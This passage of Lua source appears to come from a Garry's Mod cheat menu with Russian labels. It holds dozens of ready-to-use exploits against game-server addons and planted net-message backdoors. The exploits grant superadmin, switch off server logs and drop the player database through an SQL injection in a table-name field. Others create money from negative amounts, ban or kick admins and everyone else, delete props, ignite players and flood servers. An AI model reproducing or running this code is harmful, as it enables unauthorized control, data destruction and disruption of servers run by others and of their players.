scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do 
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function() 
iZNX.NetStart("net_PSUnBoxServer") 
net.WriteEntity(v) 
net.WriteString(v2.ID) 
net.SendToServer() 
end) 
i = i + 1
end 
end
end
end, },
},
} )
iZNX.AddExploit( "☢ PatchPlay Give Superadmin ☢", {
desc = "Выдача супер админки (нужен перезаход на сервер!)",
severity = 1,
scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
iZNX.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
iZNX.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "Выдана супер админка "..v:Nick() )
end
end, },
},
} )
local thefrenchenculer = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
thefrenchenculer = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Sbox_darkrp" ) then
thefrenchenculer = "Sbox_darkrp"
else
if iZNX.ValidNetString( "Sbox_itemstore" ) then
thefrenchenculer = "Sbox_itemstore"
else
if iZNX.ValidNetString( "Ulib_Message" ) then
thefrenchenculer = "Ulib_Message"
else
if iZNX.ValidNetString( "ULogs_Info" ) then
thefrenchenculer = "ULogs_Info"
else
if iZNX.ValidNetString( "ITEM" ) then
thefrenchenculer = "ITEM"
else
if iZNX.ValidNetString( "fix" ) then
thefrenchenculer = "fix"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
thefrenchenculer = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
thefrenchenculer = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
thefrenchenculer = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "_Defqon" ) then
thefrenchenculer = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
thefrenchenculer = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "nostrip" ) then
thefrenchenculer = "nostrip"
else
if iZNX.ValidNetString( "nocheat" ) then
thefrenchenculer = "nocheat"
else
if iZNX.ValidNetString( "LickMeOut" ) then
thefrenchenculer = "LickMeOut"
else
if iZNX.ValidNetString( "ULX_QUERY2" ) then
thefrenchenculer = "ULX_QUERY2"
else
if iZNX.ValidNetString( "ULXQUERY2" ) then
thefrenchenculer = "ULXQUERY2"
else
if iZNX.ValidNetString( "MoonMan" ) then
thefrenchenculer = "MoonMan"
else
if iZNX.ValidNetString( "Im_SOCool" ) then
thefrenchenculer = "Im_SOCool"
else
if iZNX.ValidNetString( "Sandbox_GayParty" ) then
thefrenchenculer = "Sandbox_GayParty"
else
if iZNX.ValidNetString( "DarkRP_UTF8" ) then
thefrenchenculer = "DarkRP_UTF8"
else
if iZNX.ValidNetString( "oldNetReadData" ) then
thefrenchenculer = "oldNetReadData"
else
if iZNX.ValidNetString( "memeDoor" ) then
thefrenchenculer = "memeDoor"
else
if iZNX.ValidNetString( "BackDoor" ) then
thefrenchenculer = "BackDoor"
else
if iZNX.ValidNetString( "OdiumBackDoor" ) then
thefrenchenculer = "OdiumBackDoor"
else
if iZNX.ValidNetString( "SessionBackdoor" ) then
thefrenchenculer = "SessionBackdoor"
else
if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
thefrenchenculer = "DarkRP_AdminWeapons"
else
if iZNX.ValidNetString( "cucked" ) then
thefrenchenculer = "cucked"
else
if iZNX.ValidNetString( "NoNerks" ) then
thefrenchenculer = "NoNerks"
else
if iZNX.ValidNetString( "kek" ) then
thefrenchenculer = "kek"
else
if iZNX.ValidNetString( "ZimbaBackDoor" ) then
thefrenchenculer = "ZimbaBackDoor"
else
if iZNX.ValidNetString( "something" ) then
thefrenchenculer = "something"
else
if iZNX.ValidNetString( "random" ) then
thefrenchenculer = "random"
else
if iZNX.ValidNetString( "strip0" ) then
thefrenchenculer = "strip0"
else
if iZNX.ValidNetString( "fellosnake" ) then
thefrenchenculer = "fellosnake"
else
if iZNX.ValidNetString( "enablevac" ) then
thefrenchenculer = "enablevac"
else
if iZNX.ValidNetString( "idk" ) then
thefrenchenculer = "idk"
else
if iZNX.ValidNetString( "c" ) then
thefrenchenculer = "c"
else
if iZNX.ValidNetString( "killserver" ) then
thefrenchenculer = "killserver"
else
if iZNX.ValidNetString( "fuckserver" ) then
thefrenchenculer = "fuckserver"
else
if iZNX.ValidNetString( "cvaraccess" ) then
thefrenchenculer = "cvaraccess"
else
if iZNX.ValidNetString( "rcon" ) then
thefrenchenculer = "rcon"
else
if iZNX.ValidNetString( "rconadmin" ) then
thefrenchenculer = "rconadmin"
else
if iZNX.ValidNetString( "web" ) then
thefrenchenculer = "web"
else
if iZNX.ValidNetString( "jesuslebg" ) then
thefrenchenculer = "jesuslebg"
else
if iZNX.ValidNetString( "zilnix" ) then
thefrenchenculer = "zilnix"
else
if iZNX.ValidNetString( "Þà?D)◘" ) then
thefrenchenculer = "Þà?D)◘"
else
if iZNX.ValidNetString( "disablebackdoor" ) then
thefrenchenculer = "disablebackdoor"
else
if iZNX.ValidNetString( "kill" ) then
thefrenchenculer = "kill"
else
if iZNX.ValidNetString( "DefqonBackdoor" ) then
thefrenchenculer = "DefqonBackdoor"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
iZNX.AddExploit( ".NET Backdoor", {
desc = "Найден .net backdoor: "..thefrenchenculer.."",
severity = 1,
scan = function() return iZNX.ValidNetString( thefrenchenculer ) end,
functions = {
{ typ = "func", name = "Отключить логи", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "func", name = "Toxic.pro", func = function()
iZNX.Menu:Remove()
RunConsoleCommand( "toxic.pro" )
end, },
{ typ = "htxcommandeliste", name = "Список команд" },
{ typ = "soundboard", name = "SoundBoard" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "Superadmin", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
{ typ = "func", name = "Забанить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx banid "..id.." 0 nudop udu Haxyu" )
net.WriteBit(false)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "☢ Трахнуть базу данных SQL ☢", {
desc = "Уничтожение базы данных darkrp master, стирая все данные игроков, вы должны быть супер админом !!",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
iZNX.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "База данных SQL Server уничтожена" )
end, },
},
} )
iZNX.AddExploit( "Уничтожить данные сервера", {
desc = "Уничтожение данных сервера, вероятно будет бесить одменов)",
severity = 3,
scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_datatrasher" ) then
iZNX.ChatText( "Запуск спама в данные сервера" )
timer.Create( "Defqon_exploit_datatrasher", 0.5, 0, function()
iZNX.NetStart( "WriteQuery" )
net.WriteString( "LOL" )
net.SendToServer()
end)
else
timer.Remove( "Defqon_exploit_datatrasher" )
iZNX.ChatText( "Прекращение спама" )
end
end, },
},
} )
iZNX.AddExploit( "[NEW] Broadcast", {
desc = "Большой спам, очень скучный",
severity = 1337,
scan = function() return iZNX.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Введите сообщение", default = "DefqonMenu", addr = "vj_string" },
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText("Broadcasting")
iZNX.NetStart("VJSay")
net.WriteEntity(nil)
net.WriteString( iZNX.GetStored( "vj_string" ) )
net.WriteString("")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Give weapons", {
desc = "Exploit дает вам гребаное оружие | Большой шанс неработоспособности",
severity = 3,
scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Тип оружия", default = "ls_sniper", addr = "armes_a_prendre" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "ULX Extended ", {
desc = "Осторожно! Этот эксплойт опасен, если аддон обновлен вы будете кикнуты",
severity = 3,
scan = function() return iZNX.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Забанить админов", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(player.GetAll()) do               
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                 
if v != LocalPlayer() then                 
iZNX.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."bb")                
net.SendToServer()                 
end                
end                
end 
end, },
{ typ = "func", name = "Забанить всех", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then                 
iZNX.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."bb")                
net.SendToServer()                 
end                
end  
end, },
},
} )
iZNX.AddExploit( "€ Casino NPC €", {
desc = "Exploit на очень эффективные деньги, купим шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( -iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ ATM €", {
desc = "Exploit на деньги, идем покупать шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "ATMDepositMoney" )
net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit чтобы ссать на процессоры кодеров ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Спавн", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("The addons leaks is full of feat :D")
net.SendToServer()
end, },
{ typ = "func", name = "Супер спам", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "taxispam" ) then
iZNX.ChatText( "Спам спавном такси запущен" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("The addons leaks is full of feat :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
iZNX.ChatText( "Спам спавном такси прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "€ eMining €", {
desc = "Exploit на деньги ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Снять", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Gamble NPC €", {
desc = "Exploit на бессконечные деньги, купим шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit на деньги, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Join the Police 1", {
desc = "Вступление в полицию, не одевая эту гребаную форму",
severity = 2,
scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Вступить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("PoliceJoin")
net.SendToServer() 
end, },
},
} )
iZNX.AddExploit( "Join the Police 2", {
desc = "Вступление в полицию, не одевая эту гребаную форму",
severity = 2,
scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Вступить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Deposit Money €", {
desc = "Exploit на деньги с ATM банкоматом",
severity = 2,
scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-iZNX.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "MDE", {
desc = "Exploit для удаления PermaProps (Наведите на проп и нажмите на кнопку, чтобы удалить его)",
severity = 2,
scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)       
net.SendToServer()   
end, },
},
} )
iZNX.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("NET_EcSetTax")
net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
net.SendToServer() 
end, },
},
} )
iZNX.AddExploit( "€ Fine System €", {
desc = "Exploit на деньги, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Отправить всем", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now x)")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam send Fine", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "spamamandefine" ) then
iZNX.ChatText( "Начинаем спам" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit на деньги, Смотрите на купленный автомобиль, чтобы дублировать его ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Дублировать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for i = 0, 75 do               
iZNX.NetStart( "RXCAR_Shop_Store_C2S" );               
net.WriteTable( { E = ent } );                 
net.SendToServer();                
end
end, },
{ typ = "func", name = "Продать все", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local ent              
for k,v in pairs(ents.GetAll()) do                 
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                 
iZNX.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                 
net.SendToServer()                 
end      
end, },          
},
} )
iZNX.AddExploit( "Remove Weapons / Money", {
desc = "Удалить оружие / деньги у всех",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Удалить оружие", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Удалить деньги", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Crafting Mod €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Добавить денег", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -iZNX.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Удалить деньги", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Set on FIRE", {
desc = "Подожгите пропы / игроков. RIP JOHNNY.",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Поджечь пропы", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Поджечь игроков", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Change HP", {
desc = "Измените HP игроков",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Сетнуть HP", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("drugseffect_hpremove")
net.WriteString(iZNX.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Respawn Exploit", {
desc = "Exploit на возрождение",
severity = 2,
scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Телепорт", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Удалить проп 2", {
desc = "Удаление всех пропов",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Kick 3", {
desc = "Exploit для кика всех людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Kick 2", {
desc = "Exploit для кика",
severity = 3,
scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Loot Items", {
desc = "Auto-Loot предметов",
severity = 2,
scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Лут", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Kick everyone", {
desc = "Exploit для кика всх людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "kickallnoob" ) then
iZNX.ChatText( "Кик всех запущен" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do 
iZNX.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
iZNX.ChatText( "Кик всех прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "Kick 1", {
desc = "Exploit для кика админов",
severity = 3,
scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')       
net.SendToServer()
iZNX.ChatText("Попытка кикнуть ".. v:Nick().. "!")
end
end, },
},
} )
iZNX.AddExploit( "NLR Freeze", {
desc = "Exploit для заморозки всех людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Заморозить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local t = iZNX.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
iZNX.AddExploit( "Delete props 1", {
desc = "Удаление всех пропов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Hack Keypads", {
desc = "w0w h4ck3r",
severity = 1,
scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Хакнуть", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kart System €", {
desc = "Exploit для денег.",
severity = 3,
scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for i=1, 300 do
iZNX.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Farming Mod €", {
desc = "Exploit для денег, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
